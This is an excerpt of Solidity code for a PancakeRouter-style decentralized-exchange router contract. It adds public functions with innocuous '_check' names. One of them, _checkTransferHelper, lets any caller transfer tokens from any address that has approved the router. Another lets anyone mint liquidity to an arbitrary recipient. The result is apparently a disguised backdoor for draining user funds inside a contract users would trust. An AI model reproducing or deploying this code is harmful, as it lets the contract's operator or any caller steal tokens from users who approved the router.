...
contract PancakeRouter is IPancakeRouter02 {
    ...
    function _checkAddliquidity(address tokenA, address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin) public returns(uint amountA, uint amountB){
        (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);
    }

    function _checkPairFor(address tokenA, address tokenB) public returns(address){
        address pair = PancakeLibrary.pairFor(factory, tokenA, tokenB);
        return pair;
    }

    function _checkTransferHelper(address token, address from, address pair, uint amount) public {
        TransferHelper.safeTransferFrom(token, from, pair, amount);
    }

    function _checkLiquidity(address pair, address to) public returns(uint liquidity){
        liquidity = IPancakePair(pair).mint(to);
    }
